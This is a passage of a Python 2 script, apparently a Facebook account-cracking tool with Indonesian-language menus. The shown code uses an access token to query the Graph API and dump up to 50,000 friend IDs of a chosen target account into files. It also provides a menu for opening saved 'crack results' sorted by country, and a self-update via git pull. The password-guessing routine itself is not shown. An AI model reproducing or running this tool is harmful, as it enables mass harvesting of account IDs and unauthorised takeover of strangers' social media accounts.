		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		dump()
	except OSError:
		print('\033[0;97m(\033[0;91m!\033[0;97m) File anda tidak tersimpan !')
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		os.system("python2 Crack.py")
	except requests.exceptions.ConnectionError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Tidak ada koneksi !"
		keluar()

##### ID PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo2
		print 50* "\033[1;94m─"
		print "\033[1;94m────────────────────\033[1;97m(\033[1;93mDump Id\033[1;97m)\033[1;94m─────────────────────"
		print 50* "\033[1;94m─"
		idt = raw_input("\033[0;97m(\033[0;94m•\033[0;97m) User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0;97m(\033[0;94m•\033[0;97m) Nama Akun      : "+op["name"]
		except KeyError:
			print"\033[0;97m(\033[0;94m•\033[0;97m) ID Publik Tidak Ada !"
			raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[0;97m(\033[0;94m•\033[0;97m) \033[0;97mMengambil Semua ID ...')
		print 50* "\033[1;94m─"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[0;97m(\033[0;97m"+str(len(idfromteman))+"\033[0;97m)\033[0;94m >\033[0;97m"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[0;97m ' + a['id']
		bz.close()
		print '\r\033[0;97m(\033[0;92m ✓ \033[0;97m)\033[0;97m Sukses Mengambil ID \033[0;97m....'
		print"\r\033[0;97m(\033[0;94m•\033[0;97m) Total ID : %s"%(len(idfromteman))
		done = raw_input("\r\033[0;97m(\033[0;94m•\033[0;97m) \033[0;97mSimpan Nama File : ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[0;97m(\033[0;92m √ \033[0;97m) File tersimpan : out/"+done)
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		dump()
	except OSError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) File tidak tersimpan "
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		os.system("python2 Crack.py")
	except IOError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Error creating file"
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		os.system("python2 Crack.py")
	except (KeyboardInterrupt,EOFError):
		print"\033[0;97m(\033[0;91m!\033[0;97m) Terhenti "
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		dump()
	except KeyError:
		print('\033[0;97m(\033[0;91m!\033[0;97m) Teman tidak ada !')
		raw_input("\n\033[0;97m(\033[0;91mkembali\033[0;97m)")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Tidak ada koneksi !"
		keluar()
		
		### HASIL CRACK ###
def lihat_hasil():
	os.system('clear')
	print " "
	print logo3
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m)\033[1;97m Hasil Crack ID Indonesia"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Hasil Crack ID Bangladesh"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Hasil Crack ID Usa"
	print "\033[1;94m(\033[1;97m4\033[1;94m)\033[1;97m Hasil Crack ID Pakistan & India"
	print "\033[1;94m(\033[1;97m5\033[1;94m)\033[1;97m Hasil Crack ID Malaysia"
	print "\033[1;94m(\033[1;97m6\033[1;94m)\033[1;97m Hasil Crack ID Thailand"
	print "\033[1;94m(\033[1;97m7\033[1;94m)\033[1;97m Hasil Crack ID Korea"
	print "\033[1;94m(\033[1;97m8\033[1;94m)\033[1;97m Hasil Crack ID Japan (Kakek Sugiono)"
	print "\033[1;94m(\033[1;97m9\033[1;94m)\033[1;97m Hasil Crack ID Singapura"
	print "\033[1;94m(\033[1;97m10\033[1;94m)\033[1;97m Hasil Crack ID Vietnam"
	print "\033[1;94m(\033[1;97m11\033[1;94m) \033[1;97mHasil Crack ID Israel"
	print "\033[1;94m(\033[1;97m12\033[1;94m)\033[1;97m Hasil Crack ID Fhilipina"
	print "\033[1;94m(\033[1;97m13\033[1;94m) \033[1;97mHasil Crack ID Prancis"
	print "\033[1;94m(\033[1;97m14\033[1;94m) \033[1;97mHasil Crack ID Turky"
	print "\033[1;94m(\033[1;97m15\033[1;94m) \033[1;97mHasil Crack ID Saudi Arabia"
	print "\033[1;94m(\033[1;97m16\033[1;94m)\033[1;97m Hasil Crack ID Dari Postingan Teman/Publik"
	print "\033[1;94m(\033[1;97m17\033[1;94m) \033[1;97mHasil Crack ID Dari Total Followers"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_hasil()
	
### PILIH HASIL ###
def pilih_hasil():
	keak = raw_input("\033[1;97m(?) Pilih \033[1;94m>\033[1;97m ")
	if keak =="":
		print '\033[0;97m(\033[0;91m!\033[0;97m) Isi Yg Benar Sayang!'
		pilih_hasil()
	elif keak =="1":
		os.system('xdg-open done/indo.txt')
		lihat_hasil()
	elif keak =="2":
		os.system('xdg-open done/bangla.txt')
		lihat_hasil()
	elif keak =="3":
		os.system('xdg-open done/usa.txt')
		lihat_hasil()
	elif keak =="4":
		os.system('xdg-open done/pakis_hindi.txt')
		lihat_hasil()
	elif keak =="5":
		os.system('xdg-open done/malay.txt')
		lihat_hasil()
	elif keak =="6":
		os.system('xdg-open done/thai.txt')
		lihat_hasil()
	elif keak =="7":
		os.system('xdg-open done/korea.txt')
		lihat_hasil()
	elif keak =="8":
		os.system('xdg-open done/japan.txt')
		lihat_hasil()
	elif keak =="9":
		os.system('xdg-open done/singa.txt')
		lihat_hasil()
	elif keak =="10":
		os.system('xdg-open done/viet.txt')
		lihat_hasil()
	elif keak =="11":
		os.system('xdg-open done/israel.txt')
		lihat_hasil()
	elif keak =="12":
		os.system('xdg-open done/fhilip.txt')
		lihat_hasil()
	elif keak =="13":
		os.system('xdg-open done/prancis.txt')
		lihat_hasil()
	elif keak =="14":
		os.system('xdg-open done/turkey.txt')
		lihat_hasil()
	elif keak =="15":
		os.system('xdg-open done/saudi.txt')
		lihat_hasil()
	elif keak =="16":
		os.system('xdg-open done/post.txt')
		lihat_hasil()
	elif keak =="17":
		os.system('xdg-open done/follow.txt')
		lihat_hasil()
	elif keak =="0":
		menu()
	else:
		print '\033[0;97m(\033[0;91m!\033[0;97m) Isi Yg Benar Sayang!'
	
	##### ambil cookie #####
def ambil_cookie():
	os.system ('clear')
	print logo
	print 50* "\033[1;94m─"
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
	os.system('xdg-open https://www.facebook.com/Badru.utama23')
	menu()
	
	
	
##### saya #####
def follow():
	os.system ('clear')
	print logo
	print 50* "\033[1;94m─"
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
	os.system('xdg-open https://www.facebook.com/Badru.utama23')
	menu()
	
	### perbarui script ###
def perbarui():
	os.system("clear")
	print logo
	print "\033[1;94m──────────────────────────────────────────────────"
	jalan ("\033[1;92mMemperbarui Script ...\033[1;93m")
	os.system("git pull origin master")
	raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
	os.system("python2 Crack.py")
	
if __name__=='__main__':
	
	menu()
	masuk()
	